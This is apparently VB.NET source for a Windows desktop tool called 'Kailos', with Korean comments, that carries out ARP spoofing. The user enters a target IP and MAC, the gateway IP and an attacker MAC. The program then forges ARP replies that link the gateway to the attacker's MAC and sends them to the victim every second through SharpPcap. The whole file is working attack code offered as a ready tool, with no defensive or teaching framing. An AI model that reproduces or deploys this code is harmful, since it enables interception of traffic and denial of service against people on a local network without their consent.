Imports System.Net
Imports SharpPcap
Imports SharpPcap.ARP
Imports PacketDotNet
Imports System.Threading
Imports System.Net.NetworkInformation
Imports System.Windows.Threading

Class MainWindow
    '변수 선언
    Dim DeviceList As CaptureDeviceList
    Dim RunnerDevice As ICaptureDevice
    Dim Isrun As Boolean = False
    Dim WithEvents PacketARPThread As Thread

    Public Sub Main_Loaded(sender As Object, e As RoutedEventArgs) Handles MyBase.Loaded
        DeviceList = CaptureDeviceList.Instance()

        If DeviceList.Count < 1 Then
            MsgBox("사용 가능한 네트워크 장치가 없습니다, 앱이 종료됩니다.")
            Me.Close()

        End If

        For Each Device In DeviceList
            Dim ItemStr As String = Device.ToString.Substring(Device.ToString.IndexOf("FriendlyName: "), "FriendlyName: ".Length + 80).Replace("Description:", "GatewayAddress:").Split("GatewayAddress:")(0)
            MyNetworkDeviceBox.Items.Add(ItemStr.Substring(0, ItemStr.Length - 1))
        Next

        PacketARPThread = New Thread(AddressOf ThreadFunc)
        PacketARPThread.IsBackground = True
        PacketARPThread.Start()

    End Sub

    Public Sub SwitchButton_Clicked(sender As Object, e As RoutedEventArgs) Handles SwitchButton.Click
        If Isrun = False Then


            '값 유효성 확인
            If Not MyNetworkDeviceBox.SelectedItem = "" And Not TargetIPAddress.Text = "" And Not TargetMACAddress.Text = "" And Not GatewayIPAddress.Text = "" And Not AttackerMACAddress.Text = "" Then

                Try
                    PhysicalAddress.Parse(TargetMACAddress.Text.ToUpper.Replace(":", "-"))
                    PhysicalAddress.Parse(AttackerMACAddress.Text.ToUpper.Replace(":", "-"))
                    IPAddress.Parse(TargetIPAddress.Text)
                    IPAddress.Parse(GatewayIPAddress.Text)

                Catch ex As Exception
                    MsgBox("Invalid input",, "Kailos")
                    GoTo Skip_Finally 'Finally로 이동을 막기
                End Try


                RunnerDevice = DeviceList(MyNetworkDeviceBox.SelectedIndex)
                RunnerDevice.Open()
                Isrun = True
                SwitchButton.Content = "Stop"

                MyNetworkDeviceBox.IsEnabled = False
                TargetIPAddress.IsEnabled = False
                TargetMACAddress.IsEnabled = False
                GatewayIPAddress.IsEnabled = False
                AttackerMACAddress.IsEnabled = False

            Else
                MsgBox("Invalid input",, "Kailos")
Skip_Finally:

            End If

        Else

            Isrun = False
            SwitchButton.Content = "Start"

            MyNetworkDeviceBox.IsEnabled = True
            TargetIPAddress.IsEnabled = True
            TargetMACAddress.IsEnabled = True
            GatewayIPAddress.IsEnabled = True
            AttackerMACAddress.IsEnabled = True
        End If

    End Sub

    Public Sub IPScannerDownloadBtn_Clicked(sender As Object, e As RoutedEventArgs) Handles DownloadIPScanner.Click
        Process.Start(New ProcessStartInfo("https://www.nirsoft.net/utils/wireless_network_watcher.html"))
    End Sub

    Sub ThreadFunc()
RestartThread:
        Thread.Sleep(100)

        While Isrun

            '수신자 정보
            Dim DST_IP As IPAddress
            Dim DST_MAC As PhysicalAddress

            Dispatcher.Invoke(DispatcherPriority.Normal, New Action(Sub()
                                                                        DST_IP = IPAddress.Parse(TargetIPAddress.Text.ToUpper)
                                                                        DST_MAC = PhysicalAddress.Parse(TargetMACAddress.Text.ToUpper.Replace(":", "-"))
                                                                    End Sub))

            '전송자 정보
            Dim SRC_IP As IPAddress
            Dim SRC_MAC As PhysicalAddress

            Dispatcher.Invoke(DispatcherPriority.Normal, New Action(Sub()
                                                                        SRC_IP = IPAddress.Parse(GatewayIPAddress.Text.ToUpper)
                                                                        SRC_MAC = PhysicalAddress.Parse(AttackerMACAddress.Text.ToUpper)
                                                                    End Sub))


            '패킷 생성
#Disable Warning BC42104 ' 변수에 값이 할당되기 전에 변수가 사용됨
            Dim ARP As ARPPacket = New ARPPacket(ARPOperation.Response, DST_MAC, DST_IP, SRC_MAC, SRC_IP)
#Enable Warning BC42104 ' 변수에 값이 할당되기 전에 변수가 사용됨
            Dim Eth As EthernetPacket = New EthernetPacket(SRC_MAC, DST_MAC, EthernetPacketType.Arp)
            ARP.PayloadData = New Byte() {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
            Eth.PayloadPacket = ARP

            While Isrun
                Thread.Sleep(1000)
                RunnerDevice.SendPacket(Eth) '패킷 계속 전송
            End While


            GoTo RestartThread

            RunnerDevice.Close()

        End While

        GoTo RestartThread

    End Sub

End Class
